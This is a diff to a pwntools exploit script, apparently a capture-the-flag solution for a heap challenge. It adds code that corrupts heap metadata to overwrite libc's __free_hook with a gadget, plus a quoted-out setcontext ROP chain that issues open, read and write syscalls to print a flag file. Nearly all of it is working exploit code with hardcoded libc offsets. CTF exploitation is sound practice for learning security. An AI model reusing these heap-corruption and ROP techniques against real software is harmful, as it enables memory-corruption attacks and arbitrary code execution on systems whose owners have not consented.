@@ -10,7 +10,7 @@ from pwn import *
 
 pie  = 1
 arch = 64
-bps  = [0x000000000000228D]
+bps  = [0x000000000003BE3]
 
 def change():
     ru("challenge ")
@@ -103,7 +103,71 @@ def exp2():
     libc = ELF("./libc.so.6")
     env = libc.sym['environ'] + LIBC 
 
+    gadget = LIBC + 0x0000000000154930
+    setcontext = LIBC + libc.sym['setcontext']
+    fhook = LIBC + libc.sym['__free_hook']
 
+    my_edit(heap2, 0x100000004)
+    sl(flat('a' * 0x20, 0, 0x21, fhook, 0x100))
+    my_edit(fhook, 0x100000004)
+    sl(flat(gadget))
+
+    '''
+    my_new(0x500)
+    heap4 = heap3 
+    my_edit(heap4, 0x100000004)
+
+    ret = LIBC + 0x00000000000c054a
+    poprax = 0x4a550 + LIBC
+    poprdi = 0x26b72 + LIBC
+    poprsi = 0x27529 + LIBC
+    poprdx = 0x11c371 + LIBC
+    syscall = 0x66229 + LIBC
+
+    flag = heap4 + 0xb0
+
+    payload = flat(
+        0, heap4, 0, 0, # 0
+        setcontext+0x3d, 0, # 0x20 
+        0, 0, # 30
+        0, 0, # 40 
+        0, 0, # 50 
+        0, 0, # 60 
+        0, 0, # 70
+        0, 0, # 80 
+        0, 0, # 90 
+        heap4+0x100, ret, # a0
+        # stack 0xb0
+        './flag\x00'
+        ).ljust(0x100, b'b') 
+    payload += flat(
+        # open("./flag")
+        poprax, 2, 
+        poprdi, flag, 
+        poprsi, 0, 
+        poprdx, 0, 0, 
+        syscall, 
+        # read(3, buf, 0x100)
+        poprax, 0, 
+        poprdi, 3, 
+        poprsi, flag, 
+        poprdx, 0x100, 0, 
+        syscall, 
+        # write(1, buf, 0x100)
+        poprax, 1, 
+        poprdi, 1, 
+        poprsi, flag, 
+        poprdx, 0x100, 0, 
+        syscall
+            )
+
+    sl(payload)
+
+    my_dele(heap4)
+    '''
+
+
+    '''
     my_edit(heap2, 0x100000004)
     payload = flat('a' * 0x20, 0, 0x21, env, 0x1000)
     sl(payload)
@@ -148,6 +212,7 @@ def exp2():
         syscall
         ))
 
+    '''
 
 
 context.os='linux'
